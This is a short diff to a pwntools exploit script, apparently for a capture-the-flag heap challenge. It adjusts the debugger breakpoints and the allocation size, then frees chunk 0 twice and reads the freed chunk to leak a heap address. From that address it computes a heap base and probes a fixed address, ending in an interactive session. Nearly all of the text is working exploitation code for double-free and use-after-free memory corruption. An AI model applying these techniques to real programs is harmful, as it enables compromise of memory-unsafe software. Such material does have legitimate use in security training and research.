@@ -11,6 +11,7 @@ elf = ELF(binfile)
 if len(argv) >= 2 and argv[1] == "d":
     p = gdb.debug(binfile, '''
         break *0x4009a0
+        break *0x40091f
         continue
     ''')
 else:
@@ -44,11 +45,15 @@ def exit():
     p.recvuntil(">")
     p.sendline("4")
     
-write(0x10, "A"*8)
+write(0x18, "A"*8)
 free(0)
-free(0)
-write(0x10, "B"*8)
 free(0)
 read(0)
+heap_addr = u64(p.recv(4).ljust(8, b"\x00"))
+log.info("heap_addr: 0x{:08x}".format(heap_addr))
+heap_base = heap_addr - 0x2280
+log.info("heap_base: 0x{:08x}".format(heap_base))
+read(6299672)
+
 
 p.interactive()
